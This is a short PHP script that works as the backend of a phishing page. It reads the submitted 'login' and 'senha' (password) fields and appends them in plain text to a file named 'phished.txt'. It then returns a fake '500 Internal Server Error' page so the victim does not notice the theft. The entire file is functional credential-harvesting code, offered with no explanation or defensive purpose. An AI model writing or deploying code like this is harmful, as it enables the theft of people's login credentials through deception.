<?php 
    if ($_REQUEST['login']) {
        $my_file = 'phished.txt';
        $handle = fopen($my_file, 'a') or die('Cannot open file:  '.$my_file);
        $data = 'user='.$_POST['login'].' password='.$_POST['senha']."\n";
        fwrite($handle, $data);
        fclose($handle);
    }
    header("HTTP/1.1 500 Internal Server Error");
    echo "<h1>500 Internal Server Error</h1>";
    exit();
?>
